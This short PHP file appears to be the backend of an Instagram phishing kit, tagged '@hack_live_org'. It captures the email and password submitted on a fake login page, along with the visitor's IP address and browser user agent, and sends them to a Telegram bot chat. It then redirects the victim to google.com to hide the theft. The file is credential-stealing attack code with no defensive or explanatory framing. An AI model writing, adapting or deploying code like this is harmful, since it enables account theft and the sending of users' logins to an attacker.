<?php
$message .= "🚦🎗 INSTAGRAM Account  🎗🚦" ."\n";
$message .= "🔹 email: ".$_POST['username2']."\n";
$message .= "🔹 password: ".$_POST['PASSWORD']."\n";
$message .= "🔸 IP : ".$_SERVER['REMOTE_ADDR']."\n";
$message .= "🔸 PHONE / PC: ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "➖ @hack_live_org ➖";




$ID = "00000000000"; // Chat id (Channel, sGroup, pv , ...)
$TOKEN = "000000"; //Bot Token 



$send = file_get_contents("https://api.telegram.org/bot$TOKEN/SendMessage?chat_id=$ID&text=".urlencode($message));
include('assets/css1.php');
?>
<meta content='0;url=www.google.com<?php ?>' http-equiv='refresh'/>